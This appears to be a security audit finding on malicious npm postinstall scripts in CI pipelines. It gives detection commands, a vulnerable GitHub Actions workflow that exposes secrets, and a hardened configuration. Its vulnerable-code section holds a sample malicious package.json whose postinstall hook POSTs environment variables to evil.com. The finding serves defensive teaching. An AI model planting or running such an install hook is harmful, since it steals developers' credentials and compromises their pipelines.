# OC-216: Malicious Postinstall Script in Dependency

**Category:** Infrastructure
**Severity:** HIGH
**Auditors:** INFRA-02, DEP-01
**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**OWASP:** A08:2021 - Software and Data Integrity Failures

## Description

npm, yarn, and other package managers support lifecycle scripts (preinstall, postinstall, prepare) that execute arbitrary code during `npm install`. Attackers exploit this by publishing malicious packages that run data exfiltration, credential theft, or backdoor installation code the moment a developer or CI system installs them. No code import is necessary; the attack triggers on installation alone.

The "Shai-Hulud" npm supply chain attack (November 2025) compromised tens of thousands of GitHub repositories by injecting malicious postinstall scripts that harvested credentials and propagated to dependent packages. The Ultralytics attack (December 2024) used a similar approach through compromised GitHub Actions workflows. The XZ Utils backdoor (early 2024) demonstrated that even Linux distribution-level packages can be compromised through build-time scripts.

In CI/CD pipelines, postinstall scripts execute with the same privileges as the pipeline runner, which often has access to deployment secrets, cloud credentials, and production infrastructure. A single malicious dependency can compromise the entire deployment pipeline.

## Detection

```
# Search for postinstall scripts in package.json
grep -rn "postinstall\|preinstall\|prepare\|install" **/package.json | grep "scripts"

# List all packages with install scripts
npm query ':attr(scripts, [postinstall])'

# Search for ignored script warnings
grep -rn "ignore-scripts" **/.npmrc **/package.json

# Check if scripts are disabled
grep -rn "ignore-scripts\s*=\s*false" **/.npmrc

# Search for npm install without --ignore-scripts in CI
grep -rn "npm install\|npm ci\|yarn install" **/.github/workflows/*.yml | grep -v "ignore-scripts"

# Audit packages for lifecycle scripts
npm pkg get scripts --workspaces 2>/dev/null | grep -i "install"
```

## Vulnerable Code

```yaml
# .github/workflows/build.yml
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - name: Install
        run: |
          # All lifecycle scripts execute with CI runner privileges
          # A single malicious postinstall can exfiltrate secrets
          npm ci
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET }}
```

```json
// Malicious package.json
{
  "name": "helpful-util",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl -X POST https://evil.com/exfil -d @<(env)')\""
  }
}
```

## Secure Code

```yaml
# .github/workflows/build.yml
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - name: Install (scripts disabled)
        run: |
          # Disable all lifecycle scripts during install
          npm ci --ignore-scripts
          # Run only trusted build scripts explicitly
          npm run build

      - name: Audit dependencies
        run: |
          # Check for known vulnerabilities
          npm audit --audit-level=high
          # List all packages with install scripts for review
          npx can-i-ignore-scripts
```

```ini
# .npmrc - project-level script restriction
ignore-scripts=true

# Allow scripts only for known-safe packages
# @myorg/build-tools is a first-party package with audited scripts
```

## Impact

A malicious postinstall script in a dependency can:
- Exfiltrate all environment variables (cloud credentials, API tokens, deploy keys)
- Install persistent backdoors in the project or on the CI runner
- Modify source code to inject further supply chain compromises
- Access the network to exfiltrate source code and intellectual property
- Propagate to downstream consumers (worm behavior, as seen in Shai-Hulud)
- Compromise production deployments if running in CD pipelines

## References

- Shai-Hulud npm supply chain worm (November 2025, 25,000+ malicious repos)
- Ultralytics AI supply chain attack (December 2024) via GitHub Actions
- XZ Utils backdoor (February 2024) - build-time script compromise
- CWE-829: https://cwe.mitre.org/data/definitions/829.html
- npm lifecycle scripts documentation: https://docs.npmjs.com/cli/using-npm/scripts
- Socket.dev: "Inside a malicious npm postinstall script"
